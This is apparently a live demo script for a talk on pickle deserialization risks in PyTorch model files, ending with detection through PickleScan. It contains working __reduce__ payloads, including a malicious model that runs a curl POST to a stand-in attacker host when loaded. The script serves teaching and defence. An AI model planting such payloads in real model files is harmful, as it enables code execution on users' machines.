# Live Demo Script: The Dangers of PyTorch Pickles

## Introduction
"Today, I'm going to show you just how dangerous PyTorch pickle files can be. We'll start with the basics of serialization in Python, explore how pickle works under the hood, and then demonstrate how attackers can exploit this mechanism to execute arbitrary code. Finally, I'll introduce you to a tool that can help detect malicious pickle files. Let's dive in."

---

## Part 1: Comparing Pickle and JSON Serialization

### Step 1: Basic Python Dictionary Serialization
**Demo:**
1. Create a Python dictionary:
   ```python
   data = {"name": "Alice", "age": 30, "role": "engineer"}
   ```
2. Serialize it using JSON:
   ```python
   import json
   json_data = json.dumps(data)
   print(json_data)
   ```
3. Serialize it using Pickle:
   ```python
   import pickle
   pickle_data = pickle.dumps(data)
   print(pickle_data)
   ```
4. Compare output:
    - JSON is human-readable.
    - Pickle is binary and opaque.

**Explanation:** JSON is safe and cross-language, while Pickle is Python-specific and can execute arbitrary code when deserializing.

---

## Part 2: Understanding Pickle Internals

### Step 2: Disassembling Pickle
**Demo:**
1. Use `pickletools` to analyze the Pickle serialization:
   ```python
   import pickletools
   pickletools.dis(pickle_data)
   ```
2. Explain opcodes:
    - `PROTO`: Protocol version.
    - `BINUNICODE`: Encoded strings.
    - `SETITEM`: Assign key-value pairs.

**Explanation:** Pickle opcodes define how objects are reconstructed when unpickling. Certain opcodes, like `GLOBAL`, can be dangerous.

---

## Part 3: Why Pickle Is Useful

### Step 3: Serializing a Class
**Demo:**
1. Define a Python class:
   ```python
   class Person:
       def __init__(self, name, age):
           self.name = name
           self.age = age

   p = Person("Alice", 30)
   ```
2. Serialize it:
   ```python
   pickle_person = pickle.dumps(p)
   ```
3. Deserialize it:
   ```python
   loaded_person = pickle.loads(pickle_person)
   print(loaded_person.name, loaded_person.age)
   ```

**Explanation:** Pickle is useful for saving and loading complex Python objects, but it has serious security risks.

---

## Part 4: Exploiting Pickle

### Step 4: Creating a Malicious Pickle
**Demo:**
1. Define a malicious class:
   ```python
   import os

   class Malicious:
       def __reduce__(self):
           return (os.system, ("echo Hacked!",))
   ```
2. Serialize and deserialize:
   ```python
   evil_pickle = pickle.dumps(Malicious())
   pickle.loads(evil_pickle)  # Executes "echo Hacked!"
   ```

**Explanation:** The `__reduce__` method allows arbitrary code execution when unpickling.

---

## Part 5: PyTorch and Pickle

### Step 5: Examining a PyTorch Model File
**Demo:**
1. Create a simple PyTorch model:
   ```python
   import torch
   import torch.nn as nn

   class SimpleModel(nn.Module):
       def __init__(self):
           super().__init__()
           self.fc = nn.Linear(10, 1)

   model = SimpleModel()
   torch.save(model, "model.pth")
   ```
2. Open the `model.pth` file:
   ```bash
   unzip -l model.pth
   ```
    - Show that it's a ZIP file containing a pickle inside.

**Explanation:** PyTorch uses pickle internally, making models a potential attack vector.

---

## Part 6: Weaponizing a PyTorch Model

### Step 6: Adding a Malicious Payload
**Demo:**
1. Modify the `SimpleModel` class:
   ```python
   class MaliciousModel(nn.Module):
       def __reduce__(self):
           import os
           return (os.system, ("curl -X POST http://attacker.com/pwn",))
   ```
2. Save the model:
   ```python
   torch.save(MaliciousModel(), "malicious_model.pth")
   ```
3. When unpickled, the attacker's command runs.

**Explanation:** Attackers can craft PyTorch models that execute arbitrary code when loaded.

---

## Part 7: Detecting Malicious Pickles

### Step 7: Introducing PickleScan
**Demo:**
1. Install PickleScan:
   ```bash
   pip install picklescan
   ```
2. Scan the malicious model:
   ```python
   from picklescan.scanner import scan_file
   print(scan_file("malicious_model.pth"))
   ```
3. Show that it detects the exploit.

**Conclusion:** PickleScan helps identify threats but cannot prevent attacks entirely. Always treat untrusted PyTorch models as potential threats!

---

## Closing Remarks
"We've seen how Pickle works, how it's used in PyTorch, and how attackers can exploit it. Always be cautious when loading pickle files, and use tools like PickleScan to detect threats. If you have any questions, now's the time!"

